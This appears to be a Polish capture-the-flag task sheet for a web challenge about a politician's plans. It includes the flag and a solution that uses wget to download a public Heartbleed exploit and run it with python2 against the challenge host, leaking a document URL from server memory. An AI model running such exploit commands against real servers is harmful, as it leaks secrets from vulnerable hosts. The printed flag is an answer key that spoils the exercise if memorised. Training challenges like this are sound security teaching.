# Ustawa Cezariusza

## Name
Ustawa Cezariusza

## Category
Web

## Points
20

## Flag
scs2019{5262f49749a538762e176d200b6bd3c17097cd07}

## Description
Cezariusz Pomorski to ambitny polityk pragnący zmienić świat. Chce on rozwijać Polskę i wspierać swoich rodaków. Czy aby na pewno? Dowiedz się czegoś o jego planach: <URL>

## Solution
1. Pobierz exploit `wget https://www.exploit-db.com/download/32745 -O heartbleed.py`
2. Uruchuchom exploit `python2 heartbleed.py <HOSTNAME> |fgrep -v '00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'`
3. Wyciągnij z odpowiedzi adres url do pliku docx
4. Pobierz i otwórz plik *Ustawa o przejeciu wladzy ver 5362.docx*
5. Flaga znajduje się w treści pliku docx

## Todo
* Przetestować zadanie z wieloma równoczesnymi requestami wysyłanymi od różnych użytkowników

## Created by
* Dawid